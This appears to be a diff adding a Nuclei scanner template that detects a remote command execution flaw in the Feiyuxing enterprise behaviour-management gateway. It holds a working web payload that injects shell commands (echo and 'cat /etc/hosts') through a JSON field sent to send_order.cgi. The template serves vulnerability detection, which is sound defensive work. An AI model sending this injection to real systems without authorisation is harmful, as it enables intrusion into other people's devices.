@@ -1,0 +1,30 @@
+id: feiyuxing-multiple-service-gateway-rce
+
+info:
+  name: Feiyuxing Enterprise-Level Management System - Remote Command Execution
+  author: Co5mos
+  severity: critical
+  description: |
+    飞鱼星上网行为管理系统企业版前台存在远程命令执行漏洞，攻击者可通过该漏洞执行任意系统命令，获取系统权限。
+  tags: rce,feiyuxing
+
+http:
+  - raw:
+      - |
+        POST /send_order.cgi?parameter=operation HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        {"opid":"1","name":";echo -n klmns:;cat /etc/hosts;","type":"rest"}
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: header
+        words:
+          - "klmns:"
+          - "127.0.0.1"
+      
+      - type: status
+        status:
+          - 200
